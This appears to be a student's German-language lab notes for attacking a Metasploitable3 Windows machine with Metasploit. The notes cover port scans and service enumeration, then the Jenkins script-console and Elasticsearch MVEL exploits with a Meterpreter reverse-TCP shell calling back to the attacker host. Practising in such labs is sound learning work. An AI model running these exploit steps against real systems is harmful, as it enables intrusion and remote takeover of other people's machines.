> ip a
Kali LHOST: (Angreifer)   192.168.0.19

> ipconfig
W2KB RHOST: (Verteidiger) 192.168.0.24

# Anleitung: https://www.youtube.com/watch?v=4HOGfSQEYuE

> msfconsole
> msfdb init
> nvim msf.md  		(File für Output von Schwachstellen)
> workspace -a msp3win
> workspace

> db_nmap 192.168.0.24 -p 8585, 8484	 (Defender)
> use auxiliary/scanner/http/http_version
> options
> setg RHOST (rhost)
> setg RHOSTS (rhost)
> set RPORT 9200
> run
> set RPORT 8484 (wegen [chaty]/tomcat (für javae))
> run
> set RPORT 8585
> run


-- Defender IP in Addressleiste in Google eingeben + Port 9200 = Elasticsearch output
-- -"- + Port 8484 = Jenkins
-- -"- + Port 8585 = WampServer (auf phpinfo kann man zugreifen)


> search jenkins
> use auxiliary/scanner/http/jenkins_enum
> options
> set targeturi /
> set rport 8484
> run


-- metersploit wird von Besessenen geschrieben


> search jenkins
> grep exploit search jenkins
> use exploit/multi/http/jenkins_script_console
> options
> set rport 8484
> set targeturi /
> info 					(looking into expoloiting stuff)
> set payload windows/meterpreter/reverse_tcp
> set lhost (Angreifer)
> set lport 5555
> exploit
> ...?
> unse exploit/multi/elasticsearch/script_mvel_rce
> set lport 9999
> exploit